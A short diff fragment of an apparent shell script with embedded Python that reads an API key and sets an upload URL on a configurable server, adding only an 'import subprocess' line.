@@ -207,6 +207,7 @@ read -p "-> " API_KEY
 import requests
 import socket
 import logging
+import subprocess
 
 # Configuration
 SERVER_URL = 'http://$external_server_ip:5000/upload'
